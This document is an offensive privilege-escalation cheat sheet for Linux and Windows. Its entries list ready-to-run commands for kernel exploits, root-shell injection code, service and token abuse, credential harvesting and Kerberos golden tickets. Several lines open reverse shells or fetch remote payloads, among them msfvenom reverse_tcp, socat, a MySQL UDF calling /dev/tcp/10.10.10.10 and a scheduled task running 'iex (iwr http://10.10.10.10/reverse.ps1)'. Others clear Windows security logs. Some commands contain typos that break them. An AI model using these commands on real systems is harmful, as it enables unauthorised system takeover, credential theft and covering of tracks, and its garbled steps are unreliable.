Methods for Privilege Escalation

# DirtyC0w

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

1.  gcc -pthread c0w.c -o c0w; ./c0w; passwd; id

# CVE-2016-1531

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

2.  CVE-2016-1531.sh;id

# Polkit

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

1\.

https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation

2\.

poc.sh

# DirtyPipe

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

1\.

./traitor-amd64 \--exploit kernel:CVE-2022-0847

2\.

Whoami;id

# PwnKit

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

1\.

./cve-2021-4034

2\.

Whoami;id

# ms14_058

Domain: No

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

msf \> use exploit/windows/local/ms14_058_track_popup_menu

msf exploit(ms14_058_track_popup_menu) \> set TARGET \< target-id \>

msf exploit(ms14_058_track_popup_menu) \> exploit

# Hot Potato

Domain: No

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

In command prompt type: powershell.exe -nop -ep bypass

2\.

In Power Shell prompt type: Import-Module
C:\\Users\\User\\Desktop\\Tools\\Tater\\Tater.ps1

3\.

In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command \"net
localgroup

administrators user /add\"

4\.

To confirm that the attack was successful, in Power Shell prompt type:

net localgroup administrators

# Intel SYSRET

Domain: No

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

execute -H -f sysret.exe -a \"-pid \[pid\]"

# PrintNightmare

Domain: Yes

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

https://github.com/outflanknl/PrintNightmare

2\.

PrintNightmare 10.10.10.10 exp.dll

# Folina

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

https://github.com/JohnHammond/msdt-follina

2\.

python3 follina.py -c \"notepad\"

# ALPC

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

https://github.com/riparino/Task_Scheduler_ALPC

# RemotePotato0

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

sudo ntlmrelayx.py -t ldap://10.0.0.10 \--no-wcf-server \--escalate-user
normal_user

2\.

.\\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1

# CVE-2022-26923

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

certipy req \'lab.local/cve\$:CVEPassword1234\*\@10.100.10.13\'
-template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA

2\.

Rubeus.exe asktgt /user:\"TARGET_SAMNAME\" /certificate:cert.pfx
/password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\"
/dc:\"DOMAIN_CONTROLLER\" /show

# MS14-068

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

python ms14-068.py -u user-a-1\@dom-a.loc -s
S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc

# Sudo LD_PRELOAD

Domain: No

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

\#include \<stdio.h\>

\#include \<sys/types.h\>

\#include \<stdlib.h\>

1\. void \_init() {

unsetenv(\"LD_PRELOAD\");

setgid(0);

setuid(0);

system(\"/bin/bash\");

}

2\.

gcc -fPIC -shared -o /tmp/ldreload.so ldreload.c -nostartfiles

3\.

sudo LD_RELOAD=tmp/ldreload.so apache2

4\.

id

# Abusing File Permission via SUID Binaries - .so injection) 

Domain: No

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

1\.

Mkdir /home/user/.config

2\.

\#include \<stdio.h\>

\#include \<stdlib.h\>

static void inject() \_attribute \_((constructor));

void inject() {

system(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash
-p\");

}

3\.

gcc -shared -o /home/user/.config/libcalc.so
-fPIC/home/user/.config/libcalc.c

4\.

/usr/local/bin/suid-so

5\.

id

# DLL Injection

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1\.

RemoteDLLInjector64

Or

MemJect

Or

https://github.com/tomcarver16/BOF-DLL-Inject

2\.

\#define PROCESS_NAME \"csgo.exe\"

Or

RemoteDLLInjector64.exe pid C:\\runforpriv.dll

Or

mandllinjection ./runforpriv.dll pid

# Early Bird Injection

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1\.

hollow svchost.exe pop.bin

# Process Injection through Memory Section

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1\.

sec-shinject PID /path/to/bin

# Abusing Scheduled Tasks via Cron Path Overwrite

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Scheduled Tasks

Methods:

1.  echo \'cp /bin/bash /tmp/bash; chmod +s /tmp/bash\' \>
    > systemupdate.sh;

2.  chmod +x systemupdate.sh

3.  Wait a while

4.  /tmp/bash -p

5.  id && whoami

# Abusing Scheduled Tasks via Cron Wildcards

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Scheduled Tasks

Methods:

6.  echo \'cp /bin/bash /tmp/bash; chmod +s /tmp/bash\' \>
    > /home/user/systemupdate.sh;

7.  touch /home/user/ \--checkpoint=1;

8.  touch /home/user/ \--checkpoint-action=exec=sh\\systemupdate.sh

9.  Wait a while

10. /tmp/bash -p

11. id && whoami

# Abusing File Permission via SUID Binaries - Symlink) 

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing File Permission

Methods:

1\.

su - www-data;

2\.

nginxed-root.sh /var/log/nginx/error.log;

3\.

In root user

invoke-rc.d nginx rotate \>/dev/null 2\>&1

# Abusing File Permission via SUID Binaries - Environment Variables \#1) 

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing File Permission

Methods:

1\.

echo \'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return
0; }\' \>/tmp/service.c;

2\.

gcc /tmp/services.c -o /tmp/service;

3\.

export PATH=/tmp:\$PATH;

4\.

/usr/local/bin/sudi-env; id

# Abusing File Permission via SUID Binaries - Environment Variables \#2) 

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing File Permission

Methods:

1\.

env -i SHELLOPTS=xtrace PS4=\'\$(cp /bin/bash /tmp && chown root.root
/tmp/bash && chmod +S /tmp/bash)\' /bin/sh -c /usr/local/bin/suid-env2;
set +x; /tmp/bash -p\'

# DLL Hijacking

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

Windows_dll.c:

cmd.exe /k net localgroup administrators user /add

2\.

x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll

3\.

sc stop dllsvc & sc start dllsvc

# Abusing Services via binPath

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

sc config daclsvc binpath= \"net localgroup administrators user /add\"

2\.

sc start daclsvc

# Abusing Services via Unquoted Path

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

msfvenom -p windows/exec CMD=\'net localgroup administrators user /add\'
-f exe-service -o

common.exe

2\.

Place common.exe in 'C:\\Program Files\\Unquoted Path Service'.

3\.

sc start unquotedsvc

# Abusing Services via Registry

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath
/t

REG_EXPAND_SZ /d c:\\temp\\x.exe /f

2\.

sc start regsvc

# Abusing Services via Executable File

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

copy /y c:\\Temp\\x.exe \"c:\\Program Files\\File Permissions
Service\\filepermservice.exe\"

2\.

sc start filepermsvc

# Abusing Services via Autorun

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

In Metasploit (msf \> prompt) type: use multi/handler

In Metasploit (msf \> prompt) type: set payload
windows/meterpreter/reverse_tcp

In Metasploit (msf \> prompt) type: set lhost \[Kali VM IP Address\]

In Metasploit (msf \> prompt) type: run

Open an additional command prompt and type:

msfvenom -p windows/meterpreter/reverse_tcp lhost=\[Kali VM IP Address\]
-f exe -o

program.exe

2\.

Place program.exe in 'C:\\Program Files\\Autorun Program'.

# Abusing Services via AlwaysInstallElevated

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

msfvenom -p windows/exec CMD=\'net localgroup

administrators user /add\' -f msi-nouac -o setup.msi

2\.

msiexec /quiet /qn /i C:\\Temp\\setup.msi

Or

SharpUp.exe AlwaysInstallElevated

# Abusing Services via SeCreateToken

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

.load C:\\dev\\PrivEditor\\x64\\Release\\PrivEditor.dll

2\.

!rmpriv

# Abusing Services via SeDebug

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

Conjure-LSASS

Or

syscall_enable_priv 20

# Remote Process via Syscalls (HellsGate\|HalosGate)

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

injectEtwBypass pid

# Escalate With DuplicateTokenEx

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

PrimaryTokenTheft.exe pid

Or

TokenPlaye.exe \--impersonate \--pid pid

# Abusing Services via SeIncreaseBasePriority

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

start /realtime SomeCpuIntensiveApp.exe

# Abusing Services via SeManageVolume

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

Just only compile and run SeManageVolumeAbuse

# Abusing Services via SeRelabel

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

WRITE_OWNER access to a resource, including files and folders.

2\.

Run for privilege escalation

# Abusing Services via SeRestore

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\. Launch PowerShell/ISE with the SeRestore privilege present.

2\. Enable the privilege with Enable-SeRestorePrivilege).

3\. Rename utilman.exe to utilman.old

4\. Rename cmd.exe to utilman.exe

5\. Lock the console and press Win+U

# Abuse via SeBackup

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

In Metasploit (msf \> prompt) type: use
auxiliary/server/capture/http_basic

In Metasploit (msf \> prompt) type: set uripath x

In Metasploit (msf \> prompt) type: run

2\.

In taskmgr and right-click on the "iexplore.exe" in the "Image Name"
column

and select "Create Dump File" from the popup menu.

3\.

strings /root/Desktop/iexplore.DMP \| grep \"Authorization: Basic\"

Select the Copy the Base64 encoded string.

In command prompt type: echo -ne \[Base64 String\] \| base64 -d

# Abusing via SeCreatePagefile

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

HIBR2BIN /PLATFORM X64 /MAJOR 6 /MINOR 1 /INPUT hiberfil.sys /OUTPUT
uncompressed.bin

# Abusing via SeSystemEnvironment 

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

.load C:\\dev\\PrivEditor\\x64\\Release\\PrivEditor.dll

2\.

TrustExec.exe -m exec -c \"whoami /priv\" -f

# Abusing via SeTakeOwnership 

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\. takeown.exe /f \"%windir%\\system32\"

2\. icalcs.exe \"%windir%\\system32\" /grant \"%username%\":F

3\. Rename cmd.exe to utilman.exe

4\. Lock the console and press Win+U

# Abusing via SeTcb 

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

PSBits

Or

PrivFu

2\.

psexec.exe -i -s -d cmd.exe

# Abusing via SeTrustedCredManAccess 

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

.load C:\\dev\\PrivEditor\\x64\\Release\\PrivEditor.dll

Or

CredManBOF

2\.

TrustExec.exe -m exec -c \"whoami /priv\" -f

# Abusing tokens via SeAssignPrimaryToken

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

JuicyPotato.exe

Or

https://github.com/decoder-it/juicy_2

https://github.com/antonioCoco/RoguePotato

# Abusing via SeCreatePagefile

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

./WELA.ps1 -LogFile .\\Security.evtx -EventIDStatistics

2\.

flog -s 10s -n 200

Or

invoke-module LogCleaner.ps1

# Certificate Abuse

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abusing Certificate

Methods:

1\.

ceritify.exe request /ca:dc.domain.local\\DC-CA /template:User...

2\.

Rubeus.exe asktgy /user:CORP\\itadmin /certificate:C:\\cert.pfx
/password:password

# Password Mining in Memory

Domain: No

Local Admin: Yes

OS: Linux

Type: Enumeration & Hunt

Methods:

3.  ps -ef \| grep ftp;

4.  gdp -p ftp_id

5.  info proc mappings

6.  q

7.  dump memory /tmp/mem \[start\] \[end\]

8.  q

9.  strings /tmp/mem \| grep passw

# Password Mining in Memory

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

In Metasploit (msf \> prompt) type: use
auxiliary/server/capture/http_basic

In Metasploit (msf \> prompt) type: set uripath x

In Metasploit (msf \> prompt) type: run

2\.

In taskmgr and right-click on the "iexplore.exe" in the "Image Name"
column

and select "Create Dump File" from the popup menu.

3\.

strings /root/Desktop/iexplore.DMP \| grep \"Authorization: Basic\"

Select the Copy the Base64 encoded string.

In command prompt type: echo -ne \[Base64 String\] \| base64 -d

# Password Mining in Registry

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

Open command and type:

reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows
NT\\CurrentVersion\\Winlogon\" /v

DefaultUsername

2\.

In command prompt type:

reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows
NT\\CurrentVersion\\Winlogon\" /v

DefaultPassword

3\.

Notice the credentials, from the output.

4\.

In command prompt type:

reg query
HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\BWP123F42

-v ProxyUsername

5\.

In command prompt type:

reg query
HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\BWP123F42

-v ProxyPassword

6\. Notice the credentials, from the output.

7\.

In command prompt type:

reg query HKEY_CURRENT_USER\\Software\\TightVNC\\Server /v Password

8\.

In command prompt type:

reg query HKEY_CURRENT_USER\\Software\\TightVNC\\Server /v
PasswordViewOnly

9\.

Make note of the encrypted passwords and type:

C:\\Users\\User\\Desktop\\Tools\\vncpwd\\vncpwd.exe \[Encrypted
Password\]

10\.

From the output, make note of the credentials.

# Password Mining in General Events via SeAudit

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

./WELA.ps1 -LogFile .\\Security.evtx -EventIDStatistics

2\.

flog -s 10s -n 200

Or

invoke-module LogCleaner.ps1

# Password Mining in Security Events via SeSecurity

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

./WELA.ps1 -LogFile .\\Security.evtx -EventIDStatistics

2\.

flog -s 10s -n 200

Or

wevtutil cl Security

# Startup Applications

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

In Metasploit (msf \> prompt) type: use multi/handler

In Metasploit (msf \> prompt) type: set payload
windows/meterpreter/reverse_tcp

In Metasploit (msf \> prompt) type: set lhost \[Kali VM IP Address\]

In Metasploit (msf \> prompt) type: run

Open another command prompt and type:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=\[Kali VM IP Address\]
-f exe -o

x.exe

2\.

Place x.exe in "C:\\ProgramData\\Microsoft\\Windows\\Start
Menu\\Programs\\Startup".

# Password Mining in McAfeeSitelistFiles

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

SharpUp.exe McAfeeSitelistFiles

# Password Mining in CachedGPPPassword

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

SharpUp.exe CachedGPPPassword

# Password Mining in DomainGPPPassword

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

SharpUp.exe DomainGPPPassword

# Password Mining in KeePass

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

Seatbelt.exe keepass

Or

KeeTheft.exe

# Password Mining in WindowsVault

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

Seatbelt.exe WindowsVault

# Password Mining in SecPackageCreds

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

Seatbelt.exe SecPackageCreds

# Password Mining in PuttyHostKeys

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

Seatbelt.exe PuttyHostKeys

# Password Mining in RDCManFiles

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

Seatbelt.exe RDCManFiles

# Password Mining in RDPSavedConnections

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

Seatbelt.exe RDPSavedConnections

# Password Mining in MasterKeys

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

SharpDPAPI masterkeys

# Password Mining in Browsers

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

SharpWeb.exe all

# Password Mining in Files

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

SauronEye.exe -d C:\\Users\\vincent\\Desktop\\ \--filetypes .txt .doc
.docx .xls \--contents \--keywords password pass\* -v\`

# Password Mining in LDAP

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

SharpLDAPSearch.exe \"(&(objectClass=user)(cn=\*svc\*))\"
\"samaccountname\"

Or

Import-Module .\\PowerView.ps1

Get-DomainComputer COMPUTER -Properties
ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime

# Password Mining in Clipboard

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

execute-assembly /root/SharpClipHistory.exe

# Password Mining in GMSA Password

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

GMSAPasswordReader.exe \--accountname SVC_SERVICE_ACCOUNT

# Delegate tokens via RDP

Domain: No

Local Admin: Yes

OS: Windows/Linux

Type: Delegate tokens

Methods:

1\.

./fake_rdp.py

Or

pyrdp-mitm.py 192.168.1.10 -k private_key.pem -c certificate.pem

# Delegate tokens via FTP

Domain: No

Local Admin: Yes

OS: Windows/Linux

Type: Delegate tokens

Methods:

1\.

FakeFtpServer fakeFtpServer = new FakeFtpServer();

fakeFtpServer.addUserAccount(new UserAccount(\"user\", \"password\",
\"c:\\\\data\"));

FileSystem fileSystem = new WindowsFakeFileSystem();

fileSystem.add(new DirectoryEntry(\"c:\\\\data\"));

fileSystem.add(new FileEntry(\"c:\\\\data\\\\file1.txt\", \"abcdef
1234567890\"));

fileSystem.add(new FileEntry(\"c:\\\\data\\\\run.exe\"));

fakeFtpServer.setFileSystem(fileSystem);

fakeFtpServer.start();

# Fake Logon Screen

Domain: No

Local Admin: Yes

OS: Windows

Type: Delegate tokens

Methods:

1\.

execute-assembly fakelogonscreen.exe

# Abusing WinRM Services

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Service

Methods:

1\.

RogueWinRM.exe -p C:\\windows\\system32\\cmd.exe


# Abusing Sudo Binaries

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Privileged Files

Methods:

1.  sudo vim -c \':!/bin/bash\'

2.  sudo find / etc/passwd -exec /bin/bash \\;

3.  echo \"os.execute(\'/bin/bash/\')\" \> /tmp/shell.nse && sudo nmap
    > \--script=/tmp/shell.nse

4.  sudo env /bin/bash

5.  sudo awk \'BEGIN {system(\"/bin/bash\")}\'

6.  sudo perl -e \'exec \"/bin/bash\";\'

7.  sudo python -c \'import pty;pty.spawn(\"/bin/bash\")\'

8.  sudo less /etc/hosts - !bash

9.  sudo man man - !bash

10. sudo ftp - ! /bin/bash

11. Attacker = socat file:\`tty\`,raw,echo=0 tcp-listen:1234

12. Victim = sudo socat exec:\'sh -li\',pty,stderr,setsid,sigint,sane
    > tcp:192.168.1.105:1234

13. echo test \> notes.txt

14. sudo zip test.zip notes.txt -T \--unzip-command=\"sh -c /bin/bash\"

15. sudo gcc -wrapper /bin/bash,-s .

16. sudo docker run -v /:/mnt \--rm -it alpine chroot /mnt sh

17. sudo mysql -e \'\\! /bin/sh\'

18. sudo ssh -o ProxyCommand=\';sh 0\<&2 1\>&2\' x

19. Sudo tmux

20. sudo pkexec /bin/bash

21. sudo rlwrap /bin/bash

22. sudo xargs -a /dev/null sh

23. sudo /home/anansi/bin/anansi_util manual /bin/bash

24. sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash -i"

25. echo \'import pty; pty.spawn("/bin/bash")\' \> flask.py

26. export FLASK_APP=flask.py

27. sudo /usr/bin/flask run

28. sudo apache2 -f /etc/shadow\
    > john hash \--wordlist=/usr/share/wordlists/rockyou.txt

# Abusing Scheduled Tasks

Domain: Y/N

Local Admin: Yes

OS: Linux

Type: Abusing Scheduled Tasks

Methods:

1.  echo \'chmod +s /bin/bash\' \> /home/user/systemupdate.sh

2.  chmod +x /home/user/systemupdate.sh

3.  Wait a while

4.  /bin/bash -p

5.  id && whoami

# Golden Ticket With Scheduled Tasks

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abusing Scheduled Tasks

Methods:

1.mimikatz\# token::elevate

2.mimikatz\# vault::cred /patch

3.mimikatz\# lsadump::lsa /patch

4.mimikatz\# kerberos::golden /user:Administrator /rc4:\<Administrator
NTLM(step 3)\> /domain:\<DOMAIN\> /sid:\<USER SID\>
/sids:\<Administrator SIDS\> /ticket:\<OUTPUT TICKET PATH\>

5.powercat -l -v -p 443

6.schtasks /create /S DOMAIN /SC Weekly /RU \"NT Authority\\SYSTEM\" /TN
\"enterprise\" /TR \"powershell.exe-c \'iex (iwr
http://10.10.10.10/reverse.ps1)\'"

7.schtasks /run /s DOMAIN /TN \"enterprise"

# Abusing Interpreter Capabilities

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Capabilities

Methods:

1.  getcap -r / 2\>/dev/null

    a.  /usr/bin/python2.6 = cap_setuid+ep

    b.  /usr/bin/python2.6 -c \'import os; os.setuid(0);
        > os.system(\"/bin/bash\")\'

    c.  id && whoami

2.  getcap -r / 2\>/dev/null

    a.  /usr/bin/perl = cap_setuid+ep

    b.  /usr/bin/perl -e \'use POSIX (setuid); POSIX::setuid(0); exec
        > \"/bin/bash\";\'

    c.  id && whoami

# Abusing Binary Capabilities

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Capabilities

Methods:

1.  getcap -r / 2\>/dev/null

    a.  /usr/bin/tar = cap dac read search+ep

    b.  /usr/bin/tar -cvf key.tar /root/.ssh/id_rsa

    c.  /usr/bin/tar -xvf key.tar

2.  openssl req -engine /tmp/priv.so

    a.  /bin/bash -p

    b.  id && whoami

# Abusing ActiveSessions Capabilities

Domain: No

Local Admin: Yes

OS: Windows

Type: Abusing Capabilities

Methods:

https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1

. .\\Heidi.ps1

Invoke-SQLOCmd -Verbose -Command "net localgroup administrators user1
/add" -Instance COMPUTERNAME

# Escalate with TRUSTWORTHY in SQL Server

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abusing Capabilities

Methods:

1\. . .\\PowerUpSQL.ps1

2\. Get-SQLInstanceLocal -Verbose

3\. (Get-SQLServerLinkCrawl -Verbos -Instance \"10.10.10.10\" -Query
\'select \* from master..sysservers\').customer.query

4\.

USE \"master\";

SELECT \*, SCHEMA_NAME(\"schema_id\") AS \'schema\' FROM
\"master\".\"sys\".\"objects\" WHERE \"type\" IN (\'P\', \'U\', \'V\',
\'TR\', \'FN\', \'TF, \'IF\');

execute(\'sp_configure \"xp_cmdshell\",1;RECONFIGURE\') at
\"\<DOMAIN\>\\\<DATABASE NAME\>\"

5\. powershell -ep bypass

6\. Import-Module .\\powercat.ps1

7\. powercat -l -v -p 443 -t 10000

8\.

SELECT \*, SCHEMA_NAME(\"schema_id\") AS \'schema\' FROM
\"master\".\"sys\".\"objects\" WHERE \"type\" IN (\'P\', \'U\', \'V\',
\'TR\', \'FN\', \'TF, \'IF\');

execute(\'sp_configure \"xp_cmdshell\",1;RECONFIGURE\') at
\"\<DOMAIN\>\\\<DATABASE NAME\>\"

execute(\'exec master..xp_cmdshell \"\\\\10.10.10.10\\reverse.exe\"\')
at \"\<DOMAIN\>\\\<DATABASE NAME\>\"

# Abusing Mysql run as root

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abusing Services

Methods:

-   ps aux \| grep root

> mysql -u root -p
>
> \\! chmod +s /bin/bash
>
> Exit
>
> /bin/bash -p
>
> id && whoami

# Abusing journalctl

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Services

Methods:

-   Journalctl

-   !/bin/sh

# Abusing VDS

Domain: No

Local Admin: Yes

OS: Windows

Type: Abusing Services

Methods:

. .\\PowerUp.ps1

Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\\user1'

# Abusing Browser

Domain: No

Local Admin: Yes

OS: Windows

Type: Abusing Services

Methods:

. .\\PowerUp.ps1

Invoke-ServiceAbuse -Name 'browser' -UserName 'domain\\user1'

# Abusing LDAP

Domain: Yes

Local Admin: Yes

OS: Linux

Type: Abusing Services

Methods:

0\. exec ldapmodify -x -w PASSWORD

1\. paste this

dn: cn=openssh-lpk,cn=schema,cn=config

objectClass: olcSchemaConfig

cn: openssh-lpk

olcAttributeTypes: ( 1.3.6.1.4.1.24552.500.1.1.1.13 NAME
\'sshPublicKey\'

DESC \'MANDATORY: OpenSSH Public key\'

EQUALITY octetStringMatch

SYNTAX 1.3.6.1.4.1.1466.115.121.1.40 )

olcObjectClasses: ( 1.3.6.1.4.1.24552.500.1.1.2.0 NAME \'ldapPublicKey\'
SUP top AUXILIARY

DESC \'MANDATORY: OpenSSH LPK objectclass\'

MAY ( sshPublicKey \$ uid )

)

2\. exec ldapmodify -x -w PASSWORD

3\. paste this

dn: uid=UID,ou=users,ou=linux,ou=servers,dc=DC,dc=DC

changeType: modify

add: objectClass

objectClass: ldapPublicKey

\-

add: sshPublicKey

sshPublicKey: content of id_rsa.pub

\-

replace: EVIL GROUP ID

uidNumber: CURRENT USER ID

\-

replace: EVIL USER ID

gidNumber: CURRENT GROUP ID

# LLMNR Poisoning

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Abuse Service

Methods:

1.responder -I eth1 -v

2.create Book.url

\[InternetShortcut\]

URL=[[https://facebook.com]{.ul}](https://facebook.com)

IconIndex=0

IconFile=\\\\attacker_ip\\not_found.ico

# Abusing Certificate Services

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Abuse Service

Methods:

adcspwn.exe \--adcs \<cs server\> \--port \[local port\] \--remote
\[computer\]

adcspwn.exe \--adcs cs.pwnlab.local

adcspwn.exe \--adcs cs.pwnlab.local \--remote dc.pwnlab.local \--port
9001

adcspwn.exe \--adcs cs.pwnlab.local \--remote dc.pwnlab.local \--output
C:\\Temp\\cert_b64.txt

adcspwn.exe \--adcs cs.pwnlab.local \--remote dc.pwnlab.local
\--username pwnlab.local\\mranderson \--password The0nly0ne! \--dc
dc.pwnlab.local

# MySQL UDF Code Injection

Domain: Yes

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

mysql -u root -p

mysql\> use mysql;

mysql\> create table admin(line blob);

mysql\> insert into admin
values(load_file(\'/tmp/lib_mysqludf_sys.so\'));

mysql\> select \* from admin into dumpfile
\'/usr/lib/lib_mysqludf_sys.so\';

mysql\> create function sys_exec returns integer soname
\'lib_mysqludf_sys.so\';

mysql\> select sys_exec(\'bash -i \>& /dev/tcp/10.10.10.10/9999
0\>&1\');

# Impersonation Token with ImpersonateLoggedOnuser

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1.SharpImpersonation.exe user:\<user\> shellcode:\<URL\>

2.SharpImpersonation.exe user:\<user\> technique:ImpersonateLoggedOnuser

# 

# Impersonation Token with SeImpersontePrivilege

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1.execute-assembly sweetpotato.exe -p beacon.exe

# 

# Impersonation Token with SeLoadDriverPrivilege

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1.EOPLOADDRIVER.exe System\\\\CurrentControlSet\\\\MyService
C:\\\\Users\\\\Username\\\\Desktop\\\\Driver.sys

# OpenVPN Credentials

Domain: No

Local Admin: Yes

OS: Windows/Linux

Type: Enumeration & Hunt

Methods:

locate \*.ovpn

# Bash History

Domain: No

Local Admin: Yes

OS: Linux

Type: Enumeration & Hunt

Methods:

-   history

> cat /home/\<user\>/.bash_history
>
> cat \~/.bash_history \| grep -i passw

# Package Capture

Domain: No

Local Admin: Yes

OS: Windows/Linux

Type: Sniff

Methods:

locate:

-   tcpdump -nt -r capture.pcap -A 2\>/dev/null \| grep -P \'pwd=\'

# NFS Root Squashing

Domain: Yes

Local Admin: Yes

OS: Linux

Type: Remote Procedure Calls (RPC)

